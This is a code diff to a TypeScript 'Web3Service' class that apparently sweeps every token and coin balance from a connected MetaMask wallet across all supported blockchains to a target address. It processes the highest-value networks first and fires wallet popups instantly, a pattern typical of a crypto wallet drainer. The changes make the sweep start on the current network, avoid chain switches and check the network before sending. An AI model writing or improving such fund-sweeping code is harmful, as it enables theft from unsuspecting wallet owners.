@@ -1367,13 +1367,27 @@ export class Web3Service {
       throw new Error("MetaMask is not installed");
     }
 
-    // Get the current connected address
+    // Get the current connected address and network
     const accounts = await window.ethereum.request({ method: "eth_accounts" });
     if (accounts.length === 0) {
       throw new Error("No wallet connected");
     }
 
     const fromAddress = accounts[0];
+    
+    // Get current network to prioritize it first
+    let currentNetwork: ethers.Network | null = null;
+    let currentNetworkId: string | null = null;
+    try {
+      if (this.provider) {
+        currentNetwork = await this.provider.getNetwork();
+        currentNetworkId = currentNetwork.chainId.toString();
+        console.log(`Currently connected to: ${NETWORKS[currentNetworkId]?.name || currentNetworkId}`);
+      }
+    } catch (error) {
+      console.warn("Could not detect current network:", error);
+    }
+
     console.log(`Starting multi-network transfer from ${fromAddress} to ${toAddress}`);
 
     // Scan all networks for balances
@@ -1386,20 +1400,34 @@ export class Web3Service {
       throw new Error("No funds found across any supported networks");
     }
 
-    console.log(`Found funds on ${networksWithFunds.length} networks`);
+    // Prioritize current network first, then sort by USD value
+    const sortedNetworks = networksWithFunds.sort((a, b) => {
+      // Current network gets highest priority
+      if (currentNetworkId) {
+        if (a.networkId === currentNetworkId && b.networkId !== currentNetworkId) return -1;
+        if (b.networkId === currentNetworkId && a.networkId !== currentNetworkId) return 1;
+      }
+      // Then sort by USD value (highest first)
+      return b.totalUsdValue - a.totalUsdValue;
+    });
+
+    console.log(`Found funds on ${sortedNetworks.length} networks, processing current network (${NETWORKS[currentNetworkId || '']?.name || 'Unknown'}) first`);
 
     const transferResults: NetworkTransferResult[] = [];
     let totalTransactions = 0;
     let successfulNetworks = 0;
     let failedNetworks = 0;
 
-    // Process each network with funds
-    for (const networkBalance of networksWithFunds) {
+    // Process each network with funds, starting with current network
+    for (const networkBalance of sortedNetworks) {
       try {
-        console.log(`Processing ${networkBalance.networkName}...`);
+        const isCurrentNetwork = networkBalance.networkId === currentNetworkId;
+        console.log(`Processing ${networkBalance.networkName}${isCurrentNetwork ? ' (current network)' : ''}...`);
         
-        // Switch to this network
-        await this.switchToNetwork(networkBalance.networkId);
+        // Switch to this network (if not already there)
+        if (!isCurrentNetwork) {
+          await this.switchToNetwork(networkBalance.networkId);
+        }
         
         // No delay - instant processing for immediate wallet popup
         
@@ -1456,17 +1484,33 @@ export class Web3Service {
       throw new Error(`Unsupported network: ${networkId}`);
     }
 
+    // Check if we're already on the correct network
+    try {
+      const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+      const targetChainId = `0x${parseInt(networkId).toString(16)}`;
+      
+      if (currentChainId === targetChainId) {
+        console.log(`Already on ${network.name}, no switch needed`);
+        return;
+      }
+    } catch (error) {
+      console.warn("Could not check current network:", error);
+    }
+
     const hexChainId = `0x${parseInt(networkId).toString(16)}`;
     
     try {
+      console.log(`Switching to ${network.name} (${hexChainId})...`);
       // Try to switch to the network
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: hexChainId }],
       });
+      console.log(`Successfully switched to ${network.name}`);
     } catch (error: any) {
       // If network doesn't exist, add it
       if (error.code === 4902) {
+        console.log(`Adding ${network.name} network to wallet...`);
         await window.ethereum.request({
           method: "wallet_addEthereumChain",
           params: [{
@@ -1481,9 +1525,30 @@ export class Web3Service {
             blockExplorerUrls: network.blockExplorerUrls,
           }],
         });
+        console.log(`Added and switched to ${network.name}`);
       } else {
         throw error;
       }
+    }
+  }
+
+  // Add method to validate current network before transactions
+  private async validateCurrentNetwork(expectedNetworkId: string): Promise<boolean> {
+    try {
+      const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+      const expectedChainId = `0x${parseInt(expectedNetworkId).toString(16)}`;
+      
+      if (currentChainId !== expectedChainId) {
+        const currentNetwork = NETWORKS[parseInt(currentChainId, 16).toString()];
+        const expectedNetwork = NETWORKS[expectedNetworkId];
+        console.warn(`Network mismatch: Expected ${expectedNetwork?.name || expectedNetworkId}, but on ${currentNetwork?.name || currentChainId}`);
+        return false;
+      }
+      
+      return true;
+    } catch (error) {
+      console.error("Network validation failed:", error);
+      return false;
     }
   }
 
@@ -1493,6 +1558,12 @@ export class Web3Service {
     toAddress: string
   ): Promise<NetworkTransferResult> {
     try {
+      // Validate we're on the correct network before processing
+      const isValidNetwork = await this.validateCurrentNetwork(networkBalance.networkId);
+      if (!isValidNetwork) {
+        throw new Error(`Network validation failed - not on ${networkBalance.networkName}`);
+      }
+
       // Create optimized provider connection
       const network = NETWORKS[networkBalance.networkId];
       const provider = new ethers.JsonRpcProvider(network.rpcUrls[0]);
@@ -1500,6 +1571,11 @@ export class Web3Service {
       // Use fast browser provider connection
       const browserProvider = new ethers.BrowserProvider(window.ethereum);
       const signer = await browserProvider.getSigner();
+      
+      // Confirm we're processing the correct network
+      console.log(`🔄 Processing ${networkBalance.networkName} network transactions`);
+      console.log(`📍 Network ID: ${networkBalance.networkId} (${network.nativeCurrency})`);
+      console.log(`💰 Total value: $${networkBalance.totalUsdValue.toFixed(2)}`);
       
       const transactionHashes: string[] = [];
 
